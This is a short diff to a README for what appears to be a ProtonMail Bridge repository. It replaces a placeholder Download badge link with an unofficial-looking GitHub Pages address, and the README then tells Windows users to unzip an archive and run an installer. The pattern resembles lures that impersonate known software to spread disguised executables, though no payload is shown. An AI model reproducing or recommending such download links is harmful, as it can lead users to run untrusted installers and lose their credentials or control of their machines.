@@ -8,7 +8,7 @@ It seamlessly manages encryption and decryption in the background, letting users
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-indigo?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-indigo?style=for-the-badge)](https://protonmail-bridge.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the **ProtonMail Bridge Installer** on your Windows PC.  
